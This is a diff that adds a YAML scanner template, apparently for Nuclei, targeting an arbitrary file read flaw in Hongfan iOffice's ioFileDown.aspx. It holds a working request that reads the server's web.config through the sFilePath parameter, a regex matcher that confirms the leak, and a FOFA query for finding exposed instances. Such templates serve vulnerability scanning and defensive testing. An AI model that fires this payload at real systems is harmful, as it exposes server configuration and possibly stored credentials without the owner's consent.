@@ -1,0 +1,28 @@
+id: hongfan-ioffice-ioFileDown-fileread
+
+info:
+  name: 红帆 iOffice ioFileDown.aspx - 任意文件读取漏洞
+  author: known
+  severity: high
+  description: 红帆iOffice存在一个文件读取漏洞，攻击者可以利用这个漏洞读取服务器上的任意文件，如web.config。
+  metadata:
+    verified: true
+    fofa-query: app="红帆-ioffice"
+  tags: fileread,ioffice,hongfan,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: header
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - '<configSections>'
+#
